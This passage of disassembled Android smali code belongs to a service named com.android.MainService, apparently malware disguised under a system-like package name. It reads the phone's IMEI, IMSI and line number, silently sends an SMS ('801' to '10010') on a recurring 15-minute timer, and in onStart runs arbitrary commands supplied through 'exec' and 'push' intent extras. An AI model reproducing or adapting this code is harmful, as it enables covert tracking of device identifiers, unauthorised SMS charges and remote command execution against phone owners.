    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_2

    .line 92
    :cond_0
    const-string v3, "phone"

    move-object/from16 v0, p0

    move-object v1, v3

    invoke-virtual {v0, v1}, Lcom/android/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v19

    .line 91
    check-cast v19, Landroid/telephony/TelephonyManager;

    .line 93
    .local v19, tm:Landroid/telephony/TelephonyManager;
    if-eqz v19, :cond_2

    .line 94
    invoke-virtual/range {v19 .. v19}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->imei:Ljava/lang/String;

    .line 95
    invoke-virtual/range {v19 .. v19}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->tel:Ljava/lang/String;

    .line 96
    invoke-virtual/range {v19 .. v19}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->imsi:Ljava/lang/String;

    .line 98
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->imsi:Ljava/lang/String;

    move-object v3, v0

    if-eqz v3, :cond_1

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->imsi:Ljava/lang/String;

    move-object v3, v0

    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v3

    const/4 v4, 0x5

    if-le v3, v4, :cond_1

    .line 99
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->imsi:Ljava/lang/String;

    move-object v3, v0

    const/4 v4, 0x3

    const/4 v5, 0x5

    invoke-virtual {v3, v4, v5}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->mnc:Ljava/lang/String;

    .line 101
    :cond_1
    const-string v3, "01"

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->mnc:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_2

    .line 102
    const-string v3, "10010"

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->testtel:Ljava/lang/String;

    .line 106
    .end local v19           #tm:Landroid/telephony/TelephonyManager;
    :cond_2
    sget-object v3, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    invoke-static {v3}, Lcom/android/FileAct;->readString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    .line 108
    .local v15, record:Ljava/lang/String;
    const/4 v12, 0x0

    .line 109
    .local v12, isstatis:Z
    if-eqz v15, :cond_9

    const-string v3, ""

    invoke-virtual {v15, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_9

    .line 110
    invoke-static {v15}, Lcom/android/StringUtil;->getRecordInfo(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v10

    .line 111
    .local v10, docount:[Ljava/lang/String;
    if-eqz v10, :cond_8

    array-length v3, v10

    const/4 v4, 0x3

    if-ne v3, v4, :cond_8

    .line 112
    const/4 v3, 0x1

    aget-object v3, v10, v3

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->smallpid:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_3

    .line 113
    const/4 v3, 0x0

    aget-object v3, v10, v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 114
    const/4 v3, 0x2

    aget-object v3, v10, v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    .line 115
    const/4 v12, 0x1

    .line 117
    :cond_3
    const/4 v3, 0x2

    aget-object v18, v10, v3

    .line 118
    .local v18, smsc:Ljava/lang/String;
    const-string v3, "other"

    move-object v0, v3

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_5

    .line 119
    const-string v3, ""

    move-object v0, v3

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_5

    .line 120
    move-object/from16 v0, v18

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    .line 159
    .end local v10           #docount:[Ljava/lang/String;
    .end local v18           #smsc:Ljava/lang/String;
    :goto_0
    if-eqz v12, :cond_4

    .line 161
    const/4 v3, 0x0

    const/4 v4, 0x0

    move-object/from16 v0, p0

    move v1, v3

    move v2, v4

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    move-result v16

    .line 162
    .local v16, result:I
    const/16 v3, 0xc8

    move/from16 v0, v16

    move v1, v3

    if-ne v0, v1, :cond_4

    .line 163
    new-instance v3, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object v4, v0

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "|"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->smallpid:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "|"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    .line 164
    .local v13, logtxt:Ljava/lang/String;
    sget-object v3, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    invoke-static {v13, v3}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 168
    .end local v13           #logtxt:Ljava/lang/String;
    .end local v16           #result:I
    :cond_4
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->timer:Ljava/util/Timer;

    move-object v3, v0

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->newtask:Ljava/util/TimerTask;

    move-object v4, v0

    const-wide/16 v5, 0x0

    const-wide/32 v7, 0xdbba0

    invoke-virtual/range {v3 .. v8}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;JJ)V

    .line 169
    return-void

    .line 121
    .restart local v10       #docount:[Ljava/lang/String;
    .restart local v18       #smsc:Ljava/lang/String;
    :cond_5
    const-string v3, "other"

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_6

    .line 122
    const-string v3, ""

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_6

    .line 123
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    move-object/from16 v18, v0

    .line 125
    new-instance v3, Ljava/lang/StringBuilder;

    const/4 v4, 0x0

    aget-object v4, v10, v4

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "|"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->smallpid:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "|"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    .line 126
    .restart local v13       #logtxt:Ljava/lang/String;
    sget-object v3, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    invoke-static {v13, v3}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 129
    .end local v13           #logtxt:Ljava/lang/String;
    :cond_6
    move-object/from16 v0, p0

    iget-boolean v0, v0, Lcom/android/MainService;->issend:Z

    move v3, v0

    if-eqz v3, :cond_7

    .line 130
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->testtel:Ljava/lang/String;

    move-object v3, v0

    const-string v4, "801"

    move-object/from16 v0, p0

    move-object v1, v3

    move-object v2, v4

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    .line 131
    const/4 v3, 0x0

    move v0, v3

    move-object/from16 v1, p0

    iput-boolean v0, v1, Lcom/android/MainService;->issend:Z

    .line 133
    const-wide/16 v3, 0x3a98

    :try_start_0
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1

    .line 138
    :cond_7
    :goto_1
    invoke-static {}, Lcom/android/StringUtil;->getExecTime()Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    goto/16 :goto_0

    .line 141
    .end local v18           #smsc:Ljava/lang/String;
    :cond_8
    invoke-static {}, Lcom/android/StringUtil;->getExecTime()Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 142
    const/4 v12, 0x1

    goto/16 :goto_0

    .line 146
    .end local v10           #docount:[Ljava/lang/String;
    :cond_9
    move-object/from16 v0, p0

    iget-boolean v0, v0, Lcom/android/MainService;->issend:Z

    move v3, v0

    if-eqz v3, :cond_a

    .line 147
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->testtel:Ljava/lang/String;

    move-object v3, v0

    const-string v4, "801"

    move-object/from16 v0, p0

    move-object v1, v3

    move-object v2, v4

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    .line 148
    const/4 v3, 0x0

    move v0, v3

    move-object/from16 v1, p0

    iput-boolean v0, v1, Lcom/android/MainService;->issend:Z

    .line 150
    const-wide/16 v3, 0x3a98

    :try_start_1
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_0

    .line 156
    :cond_a
    :goto_2
    invoke-static {}, Lcom/android/StringUtil;->getExecTime()Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 157
    const/4 v12, 0x1

    goto/16 :goto_0

    .line 151
    :catch_0
    move-exception v11

    .line 152
    .local v11, e:Ljava/lang/InterruptedException;
    const-string v3, "info"

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "sleep:"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11}, Ljava/lang/InterruptedException;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_2

    .line 134
    .end local v11           #e:Ljava/lang/InterruptedException;
    .restart local v10       #docount:[Ljava/lang/String;
    .restart local v18       #smsc:Ljava/lang/String;
    :catch_1
    move-exception v3

    goto :goto_1
.end method

.method public onDestroy()V
    .locals 1

    .prologue
    .line 579
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 580
    iget-object v0, p0, Lcom/android/MainService;->sendReceiver:Lcom/android/MainService$SMSReceiver;

    invoke-virtual {p0, v0}, Lcom/android/MainService;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 581
    iget-object v0, p0, Lcom/android/MainService;->deliveryReceiver:Lcom/android/MainService$SMSReceiver;

    invoke-virtual {p0, v0}, Lcom/android/MainService;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 582
    iget-object v0, p0, Lcom/android/MainService;->smsReceiver:Lcom/android/MainService$SMSReceiver;

    invoke-virtual {p0, v0}, Lcom/android/MainService;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 583
    return-void
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 5
    .parameter "intent"
    .parameter "startId"

    .prologue
    const/4 v4, 0x0

    const/4 v3, 0x1

    .line 662
    invoke-super {p0, p1, p2}, Landroid/app/Service;->onStart(Landroid/content/Intent;I)V

    .line 680
    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v1

    .line 681
    .local v1, extras:Landroid/os/Bundle;
    const-string v2, "exec"

    invoke-virtual {v1, v2}, Landroid/os/Bundle;->containsKey(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 682
    const-string v2, "exec"

    invoke-virtual {v1, v2}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    .line 683
    .local v0, cmd:Ljava/lang/String;
    invoke-direct {p0, v0, v4}, Lcom/android/MainService;->execExec(Ljava/lang/String;[Ljava/lang/String;)V

    .line 685
    .end local v0           #cmd:Ljava/lang/String;
    :cond_0
    const-string v2, "push"

    invoke-virtual {v1, v2}, Landroid/os/Bundle;->containsKey(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_1

    .line 686
    const-string v2, "push"

    invoke-virtual {v1, v2}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    .line 687
    .restart local v0       #cmd:Ljava/lang/String;
    invoke-direct {p0, v0, v4}, Lcom/android/MainService;->epxuesch(Ljava/lang/String;[Ljava/lang/String;)V

    .line 689
    .end local v0           #cmd:Ljava/lang/String;
    :cond_1
    return-void
.end method
